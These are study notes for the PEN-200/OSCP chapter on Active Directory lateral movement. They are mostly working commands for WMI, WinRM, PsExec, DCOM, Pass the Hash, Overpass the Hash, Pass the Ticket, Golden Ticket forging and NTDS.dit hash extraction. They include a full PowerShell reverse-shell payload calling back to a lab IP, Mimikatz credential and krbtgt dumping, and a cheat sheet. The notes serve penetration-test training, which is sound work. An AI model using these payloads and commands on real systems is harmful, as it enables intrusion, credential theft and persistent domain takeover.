---
title: "PEN-200 Chapter 23 - Lateral Movement in Active Directory"
aliases:
  - "PEN-200 Ch23"
  - "AD Lateral Movement and Persistence"
tags:
  - oscp
  - pen-200
  - active-directory
  - lateral-movement
  - kerberos
  - persistence
  - windows
source: "PEN-200 Chapter 23 - Lateral Movement in Active Directory"
status: "study-notes"
---

# PEN-200 Chapter 23 - Lateral Movement in Active Directory

> [!summary] Chapter focus
> This chapter takes credentials and authentication material gathered in earlier AD stages and turns them into **access to additional hosts**, **remote code execution**, and finally **persistence**. The main lateral-movement mechanisms are WMI/WinRM, PsExec, Pass the Hash, Overpass the Hash, Pass the Ticket, and DCOM. The persistence section covers Golden Tickets and Shadow Copies/NTDS.dit extraction.

## Attack-chain position

```text
Recon -> Enumeration -> Initial Access -> Privilege Escalation -> Credentials -> Pivoting -> AD -> Proof
                                                                      ^          ^
                                                                      |          |
                                                     Chapter 23 mostly lives here
```

In a realistic PEN-200/OSCP-style workflow, this chapter connects most strongly to:

- **Credentials** - reuse plaintext passwords, NTLM hashes, cached credentials, TGTs, and TGSs.
- **Pivoting** - reach internal Windows hosts that may not be directly accessible from Kali.
- **AD** - abuse domain authentication and Windows remote-management technologies to expand control.
- **Privilege Escalation / Persistence** - once Domain Admin/DC access is achieved, forge Golden Tickets or extract the AD database for long-lived access.
- **Proof** - after each move, verify identity and host with commands such as `whoami`, `hostname`, `klist`, and resource-access tests.

---

# 23.1 Active Directory Lateral Movement Techniques

Lateral movement means using an already-compromised account, password, hash, Kerberos ticket, or other authentication material to access additional machines/services inside the target network.

A key practical point is that **AD enumeration does not stop once you get credentials**. New hosts or subnets discovered after pivoting may expose new users, sessions, shares, services, or administrative paths.

## 23.1.1 WMI and WinRM

### WMI overview

**Windows Management Instrumentation (WMI)** provides management and automation capabilities. For lateral movement, the chapter uses the `Win32_Process` class and its `Create` method to start a process on a remote host.

Important requirements/concepts:

- Remote WMI uses **RPC**, initially through TCP **135**, followed by higher dynamic ports.
- The supplied account must have **local administrator** rights on the target.
- A domain user who is a local administrator can usually exercise full remote administrative privileges in this scenario.
- Processes created through WMI run in **Session 0**, so GUI applications may not be visible interactively even though the process exists.

### `wmic` remote process creation

```cmd
wmic /node:192.168.50.73 /user:jen /password:Nexus123! process call create "calc"
```

**What it does:** remotely calls `Win32_Process.Create()` and starts `calc` on the target.

**Arguments:**

- `/node:192.168.50.73` - remote target.
- `/user:jen` - account used for remote authentication.
- `/password:Nexus123!` - password for that account.
- `process call create` - invokes the WMI process-creation method.
- `"calc"` - command to execute remotely.

**When/why:** useful when you have valid local-admin credentials and RPC/WMI is reachable. `wmic` is deprecated, so the chapter also demonstrates the PowerShell/CIM equivalent.

### Build a PowerShell credential object

```powershell
$username = 'jen';
$password = 'Nexus123!';
$secureString = ConvertTo-SecureString $password -AsPlaintext -Force;
$credential = New-Object System.Management.Automation.PSCredential $username, $secureString;
```

**What it does:** creates a `PSCredential` object required by several PowerShell remote-management cmdlets.

**Arguments / components:**

- `ConvertTo-SecureString` - converts a string into a `SecureString` object.
- `-AsPlaintext` - indicates the supplied value starts as plaintext.
- `-Force` - allows plaintext conversion.
- `New-Object System.Management.Automation.PSCredential` - creates the credential object from username + secure password.

> [!warning] OPSEC / handling
> In this lab example the password appears directly in command history. In a real engagement, credential handling and logging concerns matter even when the technique itself is authorized.

### Create a CIM session over DCOM

```powershell
$options = New-CimSessionOption -Protocol DCOM
$session = New-Cimsession -ComputerName 192.168.50.73 -Credential $credential -SessionOption $Options
$command = 'calc';
```

**What it does:** prepares a remote CIM/WMI session to the target over DCOM.

**Arguments:**

- `New-CimSessionOption -Protocol DCOM` - forces the DCOM transport.
- `New-CimSession -ComputerName 192.168.50.73` - chooses the target host.
- `-Credential $credential` - supplies the `PSCredential` object.
- `-SessionOption $Options` - applies the DCOM session option.

### Execute through WMI/CIM

```powershell
Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine =$Command};
```

**What it does:** asks the remote WMI provider to create a process.

**Arguments:**

- `-CimSession $Session` - remote session to use.
- `-ClassName Win32_Process` - WMI class responsible for processes.
- `-MethodName Create` - process-creation method.
- `-Arguments @{CommandLine=$Command}` - passes the remote command line.

A `ReturnValue` of `0` indicates successful process creation in the chapter example.

### Encoding the PowerShell reverse shell

The chapter encodes the reverse-shell PowerShell command as Base64 so it is easier to pass as a single WMI/WinRS/DCOM command without complex escaping.

```python
import sys
import base64

payload = '$client = New-Object System.Net.Sockets.TCPClient("192.168.118.2",443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'
cmd = "powershell -nop -w hidden -e " + base64.b64encode(payload.encode('utf16')[2:]).decode()
print(cmd)
```

**Important values to change:**

- `192.168.118.2` - attacker/Kali IP.
- `443` - listener port.

**PowerShell flags produced:**

- `-nop` - no profile; avoids loading the user's PowerShell profile.
- `-w hidden` - asks PowerShell to use a hidden window.
- `-e` - executes a Base64-encoded command.

Run the encoder:

```bash
python3 encode.py
```

### Listener

```bash
nc -lnvp 443
```

**Arguments:**

- `-l` - listen mode.
- `-n` - no DNS resolution.
- `-v` - verbose.
- `-p 443` - listen on TCP port 443.

### Full WMI reverse-shell flow

```powershell
$username = 'jen';
$password = 'Nexus123!';
$secureString = ConvertTo-SecureString $password -AsPlaintext -Force;
$credential = New-Object System.Management.Automation.PSCredential $username, $secureString;
$Options = New-CimSessionOption -Protocol DCOM
$Session = New-Cimsession -ComputerName 192.168.50.73 -Credential $credential -SessionOption $Options
$Command = 'powershell -nop -w hidden -e <BASE64_PAYLOAD>';
Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine =$Command};
```

**Validation after callback:**

```cmd
hostname
whoami
```

The chapter confirms the callback is from `FILES04` and runs as `corp\jen`.

---

### WinRM / WinRS overview

**WinRM** is Microsoft's implementation of WS-Management. It exposes remote-management functionality over HTTP(S), commonly on TCP **5985/5986**. The chapter demonstrates both the built-in `winrs` client and PowerShell remoting.

For `winrs`, the domain user needs to belong to either:

- local **Administrators**, or
- **Remote Management Users** on the target.

### Execute commands with WinRS

```cmd
winrs -r:files04 -u:jen -p:Nexus123! "cmd /c hostname & whoami"
```

**Arguments:**

- `-r:files04` - remote host.
- `-u:jen` - username.
- `-p:Nexus123!` - password.
- `"cmd /c ..."` - remote command.
- `hostname & whoami` - validates both target host and execution identity.

### WinRS reverse shell

```cmd
winrs -r:files04 -u:jen -p:Nexus123! "powershell -nop -w hidden -e <BASE64_PAYLOAD>"
```

Start the listener first:

```bash
nc -lnvp 443
```

Then verify the shell:

```cmd
hostname
whoami
```

### PowerShell Remoting with `New-PSSession`

Create credentials:

```powershell
$username = 'jen';
$password = 'Nexus123!';
$secureString = ConvertTo-SecureString $password -AsPlaintext -Force;
$credential = New-Object System.Management.Automation.PSCredential $username, $secureString;
```

Create a remote PowerShell session:

```powershell
New-PSSession -ComputerName 192.168.50.73 -Credential $credential
```

**Arguments:**

- `-ComputerName` - target Windows host.
- `-Credential` - alternate credentials.

Enter session ID 1:

```powershell
Enter-PSSession 1
```

Validate:

```powershell
whoami
hostname
```

**When/why:** PowerShell remoting is convenient when WinRM is enabled and your credentials have the required permissions. It gives an interactive PowerShell session without needing a separate reverse-shell listener.

---

## 23.1.2 PsExec

**PsExec** is part of Sysinternals and provides remote process execution with an interactive console.

### Requirements

- Account must be a member of the target's **local Administrators** group.
- `ADMIN$` share must be available.
- File and Printer Sharing/SMB must be enabled and reachable.

### What PsExec does internally

1. Writes `psexesvc.exe` to the remote system.
2. Creates and starts a service on the remote host.
3. Starts the requested program as a child of `psexesvc.exe`.

### Interactive remote shell

```powershell
./PsExec64.exe -i \\FILES04 -u corp\jen -p Nexus123! cmd
```

**Arguments:**

- `-i` - requests interactive execution.
- `\\FILES04` - target host.
- `-u corp\jen` - domain and username.
- `-p Nexus123!` - password.
- `cmd` - program to launch remotely.

Validate:

```cmd
hostname
whoami
```

**When/why:** use when SMB/admin shares are reachable and you have local-admin credentials. It is straightforward for obtaining an interactive command shell.

---

## 23.1.3 Pass the Hash

**Pass the Hash (PtH)** authenticates to an NTLM-capable service using a user's **NTLM hash** instead of the plaintext password.

### Core concepts

- PtH applies to **NTLM authentication**, not Kerberos.
- Many tools combine PtH authentication with remote code execution.
- Common transport is **SMB**, usually TCP **445**.
- Remote-code-execution variants commonly use the Service Control Manager and named pipes.
- `ADMIN$` and local administrative permissions are normally required for the chapter's RCE scenario.
- PtH can also be used simply to access SMB resources without starting a remote service.

### Impacket `wmiexec` with an NTLM hash

```bash
/usr/bin/impacket-wmiexec -hashes :2892D26CDF84D7A70E2EB3B9F05C425E Administrator@192.168.50.73
```

**Arguments:**

- `-hashes LMHASH:NTHASH` - supplies password hashes instead of a plaintext password.
- The chapter leaves the LM side empty: `:NTHASH`.
- `Administrator@192.168.50.73` - username and target.

Validate:

```cmd
hostname
whoami
```

### Important limitation from the chapter

The technique works for:

- AD domain accounts that have appropriate rights.
- The built-in local `Administrator` account.

The chapter notes that modern Windows security changes prevent this style of remote authentication for arbitrary other local administrator accounts.

### Relationship to pivoting

If the target host is only reachable through a compromised internal system, the same PtH operation can be sent through a pivot/proxy path established earlier in the attack chain.

---

## 23.1.4 Overpass the Hash

**Overpass the Hash** converts an NTLM user hash into a Kerberos-authenticated context. Instead of authenticating to remote services directly with NTLM, you use the hash to obtain Kerberos tickets and then use Kerberos-aware tools.

### Step 1 - Dump cached credentials with Mimikatz

Run Mimikatz from an elevated/admin shell:

```text
mimikatz # privilege::debug
mimikatz # sekurlsa::logonpasswords
```

**Commands:**

- `privilege::debug` - enables debug privilege so Mimikatz can access protected process memory such as LSASS.
- `sekurlsa::logonpasswords` - enumerates credential material associated with logon sessions, including NTLM hashes when available.

The chapter obtains Jen's NTLM hash:

```text
369def79d8372408bf6e93364cc93075
```

### Step 2 - Create a new process using the hash

```text
mimikatz # sekurlsa::pth /user:jen /domain:corp.com /ntlm:369def79d8372408bf6e93364cc93075 /run:powershell
```

**Arguments:**

- `/user:jen` - account whose hash is being used.
- `/domain:corp.com` - AD domain.
- `/ntlm:<hash>` - NTLM hash.
- `/run:powershell` - process to create.

**Important behavior:** the new process can obtain Kerberos tickets for Jen, but `whoami` may still display the original local process token identity. `whoami` does not inspect imported/acquired Kerberos tickets.

### Step 3 - Inspect ticket cache

```powershell
klist
```

Initially there may be zero cached tickets.

### Step 4 - Trigger domain authentication to obtain tickets

```powershell
net use \\files04
```

**Why:** accessing a domain resource forces Kerberos authentication, causing a TGT and then a service ticket to be requested.

Inspect again:

```powershell
klist
```

Expected ticket types in the chapter:

- TGT: `krbtgt/CORP.COM`
- TGS: `cifs/files04`

> [!tip]
> `net use` is only one trigger. Any command that requires domain permissions and therefore causes Kerberos authentication can cause a service ticket to be requested.

### Step 5 - Reuse Kerberos with PsExec

```powershell
cd C:\tools\SysinternalsSuite\
.\PsExec.exe \\files04 cmd
```

Validate:

```cmd
whoami
hostname
```

**Why it works:** PsExec itself does not accept an NTLM hash, but once the hash has been transformed into a Kerberos-authenticated logon context, PsExec can reuse the Kerberos ticket.

### Mental model

```text
NTLM hash
   |
   v
Mimikatz sekurlsa::pth
   |
   v
new logon context
   |
   +--> access domain resource
            |
            v
         Kerberos TGT/TGS
            |
            v
      Kerberos-aware remote tool
```

---

## 23.1.5 Pass the Ticket

**Pass the Ticket (PtT)** reuses already-issued Kerberos tickets instead of passwords or hashes.

The chapter emphasizes a **TGS/service ticket** because it can be exported and injected into another session and then used to access the particular service it was issued for.

### Scenario

- Current user: `corp\jen`
- Privileged user session present: `dave`
- Target resource: `\\web04\backup`
- Jen cannot access the share; Dave has a CIFS ticket that can.

### Confirm access is denied

```powershell
whoami
ls \\web04\backup
```

### Export Kerberos tickets from memory

```text
mimikatz # privilege::debug
mimikatz # sekurlsa::tickets /export
```

**Commands:**

- `privilege::debug` - obtains required debug privilege.
- `sekurlsa::tickets /export` - enumerates TGT/TGS material from LSASS and saves tickets to disk in Mimikatz `.kirbi` format.

### List exported tickets

```powershell
dir *.kirbi
```

Look for a service ticket whose name indicates the required service and target, for example:

```text
dave@cifs-web04.kirbi
```

### Inject selected ticket

```text
mimikatz # kerberos::ptt [0;12bd0]-0-0-40810000-dave@cifs-web04.kirbi
```

**Argument:** the `.kirbi` file containing the desired ticket.

`kerberos::ptt` means **Pass The Ticket** and injects the ticket into the current logon session.

### Verify ticket cache

```powershell
klist
```

The chapter verifies a ticket for:

```text
Client: dave @ CORP.COM
Server: cifs/web04 @ CORP.COM
```

### Access the restricted share

```powershell
ls \\web04\backup
```

If the ticket is valid for CIFS on `WEB04`, the share can now be accessed as the identity represented by the ticket.

### Key distinction

- **Overpass the Hash:** hash -> Kerberos tickets.
- **Pass the Ticket:** already-existing Kerberos ticket -> inject/reuse directly.

---

## 23.1.6 DCOM

**DCOM (Distributed Component Object Model)** extends COM so software components can interact across machines. The chapter abuses an MMC COM object to execute commands remotely.

### Requirements / transport

- Uses RPC, starting on TCP **135**.
- Requires local administrator access to call the remote DCOM Service Control Manager/API in the demonstrated scenario.

### Create a remote MMC application object

```powershell
$dcom = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application.1","192.168.50.73"))
```

**What it does:** creates an instance of the `MMC20.Application.1` COM object on the target host.

**Components:**

- `[type]::GetTypeFromProgID(...)` - resolves the COM ProgID on a remote host.
- `MMC20.Application.1` - Microsoft Management Console application class.
- `192.168.50.73` - remote target.
- `[System.Activator]::CreateInstance(...)` - instantiates the remote COM object.

### Execute `calc` remotely

```powershell
$dcom.Document.ActiveView.ExecuteShellCommand("cmd",$null,"/c calc","7")
```

The `ExecuteShellCommand` method takes four parameters:

1. Command
2. Directory
3. Parameters
4. WindowState

Here:

- `"cmd"` - program.
- `$null` - no specific working directory.
- `"/c calc"` - command-line arguments.
- `"7"` - window-state value used by the chapter.

### Verify process on the target

```cmd
tasklist | findstr "calc"
```

**Why:** the spawned GUI process runs in Session 0, so checking the process list is a better validation method than expecting to see a desktop window.

### DCOM reverse-shell payload

```powershell
$dcom.Document.ActiveView.ExecuteShellCommand("powershell",$null,"powershell -nop -w hidden -e <BASE64_PAYLOAD>","7")
```

Listener:

```bash
nc -lnvp 443
```

Validate after callback:

```powershell
whoami
hostname
```

---

# 23.2 Active Directory Persistence

Persistence techniques help an attacker keep access after events such as reboot, credential changes, or the loss of an initial foothold.

The chapter makes an important engagement-scope point: **persistence may be out of scope in many penetration tests** because it introduces cleanup risk. It should only be performed when the rules of engagement authorize it.

## 23.2.1 Golden Ticket

### Kerberos background

A TGT is encrypted/signature-protected using a secret associated with the domain's **`krbtgt`** account. If an attacker obtains the `krbtgt` password hash/key, they can forge their own TGTs - **Golden Tickets**.

Why this is powerful:

- A Silver Ticket forges a specific TGS/service ticket.
- A Golden Ticket forges a TGT and can therefore be used to obtain tickets for domain-wide resources.
- The forged TGT can claim highly privileged group memberships.
- The `krbtgt` password is not changed automatically during normal operation, which makes compromise of this material particularly serious.

> [!danger] Scope warning
> The chapter explicitly warns that stolen `krbtgt` material can grant extremely broad domain access. In a real engagement, obtain explicit authorization before executing Golden Ticket persistence.

### Baseline: PsExec to DC fails

```cmd
PsExec64.exe \\DC1 cmd.exe
```

Expected result before privilege escalation/persistence:

```text
Access is denied.
```

### Dump domain secrets / `krbtgt` hash

On the domain controller with Domain Admin-level access:

```text
mimikatz # privilege::debug
mimikatz # lsadump::lsa /patch
```

**Commands:**

- `privilege::debug` - enables debug privilege.
- `lsadump::lsa /patch` - patches/reads LSA-related credential material so domain account hashes can be dumped, including `krbtgt`.

The output provides:

- Domain SID.
- `krbtgt` RID/account.
- `krbtgt` NTLM hash.

### Gather current user's/domain SID if needed

```cmd
whoami /user
```

**Why:** the Golden Ticket command needs the domain SID.

### Purge existing tickets

```text
mimikatz # kerberos::purge
```

**Why:** removes existing cached Kerberos tickets from the current session, reducing confusion when validating the forged ticket.

### Forge and inject the Golden Ticket

```text
mimikatz # kerberos::golden /user:jen /domain:corp.com /sid:S-1-5-21-1987370270-658905905-1781884369 /krbtgt:1693c6cefafffc7af11ef34d1c788f47 /ptt
```

**Arguments:**

- `/user:jen` - existing domain account represented by the ticket.
- `/domain:corp.com` - FQDN of the AD domain.
- `/sid:<SID>` - domain SID.
- `/krbtgt:<hash>` - `krbtgt` password hash/key material.
- `/ptt` - injects the generated ticket directly into the current session.

The chapter notes that current Microsoft behavior requires using an **existing account** in the forged ticket.

### Spawn a command shell from Mimikatz

```text
mimikatz # misc::cmd
```

**Purpose:** opens a command prompt in the current Mimikatz-authenticated context so the injected ticket can be used by subsequent commands.

### Re-attempt lateral movement to the DC

```cmd
PsExec.exe \\dc1 cmd.exe
```

Validate:

```cmd
ipconfig
whoami
whoami /groups
```

The forged ticket causes the account to be treated as a member of privileged groups such as **Domain Admins**.

### Hostname vs IP matters for Kerberos

The chapter demonstrates that using the DC's **hostname** allows Kerberos authentication, while directly using the **IP address** can force NTLM and therefore fail to use the forged Kerberos ticket.

```cmd
psexec.exe \\192.168.50.70 cmd.exe
```

Expected in the chapter:

```text
Access is denied.
```

### Practical model

```text
Compromise DA/DC
   |
   v
Dump krbtgt hash + domain SID
   |
   v
Forge Golden Ticket
   |
   v
Inject ticket (/ptt)
   |
   v
Authenticate through Kerberos using hostname/SPN
   |
   v
Domain-wide privileged access / persistence
```

---

## 23.2.2 Shadow Copies

**Volume Shadow Copy Service (VSS)** creates snapshots of files/volumes. A Domain Admin can abuse a shadow copy to obtain the normally locked `NTDS.dit` Active Directory database and then extract domain credential material offline.

### Step 1 - Create a shadow copy

```cmd
vshadow.exe -nw -p C:
```

**Arguments:**

- `-nw` - no-writers mode; disables VSS writers and speeds creation in the chapter's scenario.
- `-p` - creates a persistent shadow copy stored on disk.
- `C:` - volume to snapshot.

**Important output to record:** the **Shadow copy device name**, e.g.:

```text
\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2
```

### Step 2 - Copy `NTDS.dit` from the snapshot

```cmd
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\windows\ntds\ntds.dit c:\ntds.dit.bak
```

**Why:** the live AD database is normally locked/in use. The VSS snapshot provides a consistent point-in-time copy that can be copied.

### Step 3 - Save the SYSTEM registry hive

```cmd
reg.exe save hklm\system c:\system.bak
```

**Arguments:**

- `save` - exports a registry hive.
- `hklm\system` - SYSTEM hive.
- `c:\system.bak` - output file.

**Why:** secretsdump needs SYSTEM hive material to recover the boot key required to decrypt secrets in `NTDS.dit`.

### Step 4 - Move both files to Kali

Required files:

```text
ntds.dit.bak
system.bak
```

### Step 5 - Extract hashes and Kerberos keys offline

```bash
impacket-secretsdump -ntds ntds.dit.bak -system system.bak LOCAL
```

**Arguments:**

- `-ntds ntds.dit.bak` - offline Active Directory database.
- `-system system.bak` - offline SYSTEM registry hive.
- `LOCAL` - tells secretsdump to parse local/offline files rather than connect to a remote target.

**Output includes:**

- NTLM hashes for domain users and computer accounts.
- `krbtgt` hash.
- Kerberos AES/DES keys where present.

Those credentials can then be:

- cracked offline, or
- reused directly with techniques such as Pass the Hash.

### Alternative persistence/credential-recovery idea mentioned

The chapter notes that, instead of copying files and leaving a larger artifact trail, an attacker with sufficient rights can use AD replication functionality (DCSync, covered earlier in PEN-200) to obtain password hashes remotely. The exact DCSync command is not re-demonstrated in this chapter.

---

# 23.3 Wrapping Up

The chapter closes the PEN-200 Active Directory sequence by combining three major skills:

1. **Enumeration** - know who is logged in where, which accounts have local admin rights, and which services/hosts are reachable.
2. **Authentication abuse / lateral movement** - turn plaintext credentials, NTLM hashes, or Kerberos tickets into access to additional systems.
3. **Persistence / credential dominance** - once highly privileged AD access is achieved, compromise `krbtgt` or `NTDS.dit` to retain or regenerate powerful credentials.

The effectiveness of any technique depends on the target's security posture, network segmentation, legacy compatibility requirements, endpoint protections, account rights, and enabled management services.

The chapter intentionally focuses on **execution** rather than stealth. For OSCP-style labs, the priority is usually proving a reliable path and documenting it; on a red-team engagement, technique selection would also consider detectability and cleanup.

---

# Technique Comparison

| Technique | Authentication material | Main protocol/service | Typical requirement | Result |
|---|---|---|---|---|
| WMI | Plaintext credential / credential object | RPC/WMI | Local admin | Remote process creation |
| WinRS / WinRM | Plaintext credential | WinRM / WS-Man | Administrators or Remote Management Users | Remote commands / interactive PS |
| PsExec | Plaintext credential or existing Kerberos context | SMB + service creation | Local admin, `ADMIN$`, File/Printer Sharing | Interactive remote shell |
| Pass the Hash | NTLM hash | NTLM over SMB/WMI/etc. | Suitable account; often local admin for RCE | Remote authentication / code execution |
| Overpass the Hash | NTLM hash | Kerberos | Hash + ability to create/use logon context | NTLM hash -> TGT/TGS -> Kerberos access |
| Pass the Ticket | TGT/TGS `.kirbi` | Kerberos | Access to ticket material; admin may be needed to dump others' LSASS tickets | Impersonate ticket owner for relevant service |
| DCOM | Plaintext/active admin credentials | RPC/DCOM | Local admin | Remote command execution |
| Golden Ticket | `krbtgt` hash + domain SID | Kerberos | Prior DA/DC compromise | Forge privileged TGTs / persistence |
| Shadow Copy | DA-level access to DC | VSS + offline parsing | Domain Admin / DC access | Dump all domain hashes/keys offline |

---

# OSCP Decision Guide

> [!question] I have plaintext credentials. What should I try?
> 1. Check whether the account is a local administrator on another host.
> 2. Check reachability for SMB, RPC/WMI, or WinRM.
> 3. Try an appropriate remote-management path: WinRM/WinRS, WMI, or PsExec.
> 4. Validate immediately with `whoami` and `hostname`.

> [!question] I only have an NTLM hash.
> - If the service supports NTLM and the account has rights: try **Pass the Hash**.
> - If you need a Kerberos-only/native workflow: use **Overpass the Hash** to obtain Kerberos tickets, then use Kerberos-aware tools.

> [!question] I find another user's Kerberos tickets in memory.
> - Export and inspect the ticket service/target.
> - Inject the appropriate ticket with **Pass the Ticket**.
> - Test only the service the TGS is valid for.

> [!question] I have Domain Admin or DC control.
> - For short-term credential extraction: Shadow Copy + `NTDS.dit`/SYSTEM or DCSync.
> - For persistence when explicitly authorized: `krbtgt` compromise enables Golden Tickets.

---

# Command and Tool Reference

## WMI / CIM

```cmd
wmic /node:192.168.50.73 /user:jen /password:Nexus123! process call create "calc"
```

```powershell
$username = 'jen';
$password = 'Nexus123!';
$secureString = ConvertTo-SecureString $password -AsPlaintext -Force;
$credential = New-Object System.Management.Automation.PSCredential $username, $secureString;
$options = New-CimSessionOption -Protocol DCOM
$session = New-Cimsession -ComputerName 192.168.50.73 -Credential $credential -SessionOption $Options
$command = 'calc';
Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine =$Command};
```

## Reverse-shell encoder/listener

```bash
python3 encode.py
nc -lnvp 443
```

## WinRS / WinRM

```cmd
winrs -r:files04 -u:jen -p:Nexus123! "cmd /c hostname & whoami"
winrs -r:files04 -u:jen -p:Nexus123! "powershell -nop -w hidden -e <BASE64_PAYLOAD>"
```

```powershell
New-PSSession -ComputerName 192.168.50.73 -Credential $credential
Enter-PSSession 1
```

## PsExec

```powershell
./PsExec64.exe -i \\FILES04 -u corp\jen -p Nexus123! cmd
```

```powershell
.\PsExec.exe \\files04 cmd
```

## Pass the Hash

```bash
/usr/bin/impacket-wmiexec -hashes :2892D26CDF84D7A70E2EB3B9F05C425E Administrator@192.168.50.73
```

## Mimikatz credential/ticket operations

```text
privilege::debug
sekurlsa::logonpasswords
sekurlsa::pth /user:jen /domain:corp.com /ntlm:369def79d8372408bf6e93364cc93075 /run:powershell
sekurlsa::tickets /export
kerberos::ptt <ticket.kirbi>
kerberos::purge
lsadump::lsa /patch
kerberos::golden /user:jen /domain:corp.com /sid:<DOMAIN_SID> /krbtgt:<KRBTGT_HASH> /ptt
misc::cmd
```

## Kerberos inspection / triggering

```powershell
klist
net use \\files04
```

## DCOM

```powershell
$dcom = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application.1","192.168.50.73"))
$dcom.Document.ActiveView.ExecuteShellCommand("cmd",$null,"/c calc","7")
$dcom.Document.ActiveView.ExecuteShellCommand("powershell",$null,"powershell -nop -w hidden -e <BASE64_PAYLOAD>","7")
```

```cmd
tasklist | findstr "calc"
```

## Golden Ticket validation

```cmd
whoami /user
whoami /groups
PsExec.exe \\dc1 cmd.exe
psexec.exe \\192.168.50.70 cmd.exe
```

## Shadow Copy / NTDS.dit

```cmd
vshadow.exe -nw -p C:
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\windows\ntds\ntds.dit c:\ntds.dit.bak
reg.exe save hklm\system c:\system.bak
```

```bash
impacket-secretsdump -ntds ntds.dit.bak -system system.bak LOCAL
```

---

# Mini Cheat Sheet - Keep Beside You During a Machine

```text
# 1. Validate where/who you are
hostname
whoami

# 2. WMI with plaintext credentials
wmic /node:<IP> /user:<USER> /password:<PASS> process call create "cmd /c <COMMAND>"

# 3. WinRS remote execution
winrs -r:<HOST> -u:<USER> -p:<PASS> "cmd /c hostname & whoami"

# 4. PowerShell WinRM session
New-PSSession -ComputerName <IP> -Credential $credential
Enter-PSSession <ID>

# 5. PsExec with plaintext creds
PsExec64.exe -i \\<HOST> -u <DOMAIN>\<USER> -p <PASS> cmd

# 6. PtH with Impacket WMIExec
impacket-wmiexec -hashes :<NTHASH> <USER>@<IP>

# 7. Mimikatz privilege + cached credential dump
privilege::debug
sekurlsa::logonpasswords

# 8. Overpass the Hash
sekurlsa::pth /user:<USER> /domain:<DOMAIN> /ntlm:<NTHASH> /run:powershell

# 9. Kerberos ticket cache
klist

# 10. Trigger Kerberos authentication
net use \\<HOST>

# 11. Export tickets
sekurlsa::tickets /export

# 12. Pass the Ticket
kerberos::ptt <ticket.kirbi>

# 13. Check exported tickets
dir *.kirbi

# 14. DCOM remote MMC object
$dcom = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application.1","<IP>"))

# 15. DCOM execute command
$dcom.Document.ActiveView.ExecuteShellCommand("cmd",$null,"/c <COMMAND>","7")

# 16. Golden Ticket prerequisites: domain SID + krbtgt hash
whoami /user
lsadump::lsa /patch

# 17. Golden Ticket
kerberos::golden /user:<EXISTING_USER> /domain:<DOMAIN> /sid:<DOMAIN_SID> /krbtgt:<HASH> /ptt

# 18. Shadow copy of DC volume
vshadow.exe -nw -p C:

# 19. Save SYSTEM hive
reg.exe save hklm\system c:\system.bak

# 20. Offline AD credential dump
impacket-secretsdump -ntds ntds.dit.bak -system system.bak LOCAL
```

---

# Exam Reminders

- **Always verify identity and host** after lateral movement: `whoami`, `hostname`.
- For Kerberos attacks, use **hostnames/FQDNs** when you want Kerberos. Using an IP may cause NTLM to be selected instead.
- `klist` is your fastest sanity check for whether the intended Kerberos ticket exists in the current logon session.
- A TGS is **service-specific**. A CIFS ticket for `WEB04` is useful for CIFS on `WEB04`, not automatically every service everywhere.
- PtH requires **NTLM-capable authentication**; Overpass the Hash is how the chapter turns an NTLM hash into a Kerberos-capable context.
- PsExec usually means: **SMB reachable + ADMIN$ + local admin**.
- WMI/DCOM usually means: **RPC reachable + local admin**.
- WinRM means: **WinRM enabled + account authorized for remote management**.
- If the target is behind another compromised host, combine these techniques with your **pivot/proxy/tunnel** instead of assuming direct reachability from Kali.
- `krbtgt` compromise is extremely powerful. Treat Golden Ticket activity as a persistence action that should be **explicitly in scope**.
- On a DC, `NTDS.dit` + SYSTEM hive can expose essentially the domain's credential material; protect copies and remove them during cleanup.

